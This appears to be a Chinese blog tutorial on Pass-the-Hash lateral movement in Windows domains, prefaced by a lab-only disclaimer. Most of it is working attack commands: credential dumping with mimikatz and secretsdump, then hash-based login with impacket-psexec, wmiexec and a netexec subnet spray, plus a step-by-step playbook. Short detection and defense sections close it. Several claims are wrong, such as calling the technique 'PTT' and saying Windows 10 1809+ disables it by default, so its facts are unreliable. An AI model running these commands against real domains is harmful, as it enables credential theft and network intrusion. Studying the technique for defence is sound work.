横向移动 Pass-the-Hash 实战（无需密码的域内横向）

Pass-the-Hash 横向移动完整实战：原理、NT hash 获取、psexec/wmiexec 利用、凭据传递与检测防御。

Aug 29, 2026
阅读时长: 2 分钟

写在前面：合法学习边界

Pass-the-Hash 只用于授权靶场。对真实域模拟凭据可能触犯法律。

一、原理

NT hash（NTLM 密码哈希）是 Windows 认证的核心。域内同一用户的 NT hash 在所有机器上相同（由域控分发）。

1
2
3

NT hash = 用 MD4 算法对明文密码加密后的 16 字节值
认证时：客户端不传密码，传用 hash 加密的 challenge 响应
→ 攻击者拿到 hash，可以模拟认证，无需知道明文密码

1
2

攻击者获取 NT hash → 用 hash 模拟认证 → 通过 SMB/WMI/RDP 横向到同域其他主机
这就是 Pass-the-Hash（PTT）

三、影响与危害

1
2
3
4

• 获取一台主机的 NT hash = 获取同域所有主机访问权限
• 无需明文密码，无法被密码策略保护
• 横向移动速度极快
• 不会触发"密码错误"类告警

四、获取 NT hash

1
2
3
4

方法1：mimikatz（从内存中提取）
  mimikatz # sekurlsa::logonpasswords
  → 输出域用户明文密码和 NT hash

方法2：secretsdump.py（从注册表/安全数据库提取）
  secretsdump.py 域/管理员:密码@目标IP -just-dc

方法3：hashdump（Linux 提权后）
  hashdump

1
2

示例输出：
域管理员:admin:F49E1C21DF5E15F5D10B0C145B477C90:2D734D10...

五、横向移动

方法1：psexec（SMB + Pass-the-Hash）

1
2
3
4
5
6
7

# Linux
impacket-psexec 域/用户名@目标IP -hashes :F49E1C21DF5E15F5D10B0C145B477C90

# Windows（mimikatz）
privilege::debug
sekurlsa::pth /user:域管理员 /domain:域 /ntlm:F49E1C21DF5E15F5D10B0C145B477C90
# 此时当前进程已用该 hash 认证，可以用 cmd/net use 横向

方法2：wmiexec（无需落地工具）

1

impacket-wmiexec 域/用户名@目标IP -hashes :F49E1C21DF5E15F5D10B0C145B477C90

方法3：RDP（Win10 1809+ 支持 Pass-the-Hash 直连）

1

用 mimikatz PTH 后，直接 mstsc 远程桌面

方法4：netexec（批量横向）

1
2

netexec smb 10.0.0.0/24 -u 域管理员 -H F49E1C21DF5E15F5D10B0C145B477C90
# 批量用 hash 扫内网，自动横向

六、操作步骤

1
2
3
4
5

第 1 步：获取目标用户的 NT hash
第 2 步：确认目标用户有管理员权限（domain admin / local admin）
第 3 步：选工具（psexec/wmiexec/edr）用 hash 认证横向
第 4 步：确认获得 shell 后继续信息收集
第 5 步：用同一 hash 继续打同域其他主机

七、检测

1
2
3

• Event ID 4624：登录类型 3（网络）异常频繁
• 非域控主机出现大量 SMB 登录
• 同一用户在多台主机短时间登录

八、防御

1
2
3
4
5

1. 启用 Credential Guard（虚拟隔离 LSASS，防内存提取）
2. 限制 SMB 直连：网络层 ACL 禁止域成员机互连 SMB
3. 部署 EDR（检测凭据窃取行为）
4. 使用 Kerberos 约束委派替代 NTLM
5. Windows 10 1809+ 默认禁用 Pass-the-Hash（需破解 hash）

九、小结

Pass-the-Hash 的本质是"NT hash 在域内可传递"。掌握它的关键是理解：一台主机的 hash = 同域所有主机的通行证。防守核心是 Credential Guard + EDR + 网络隔离。
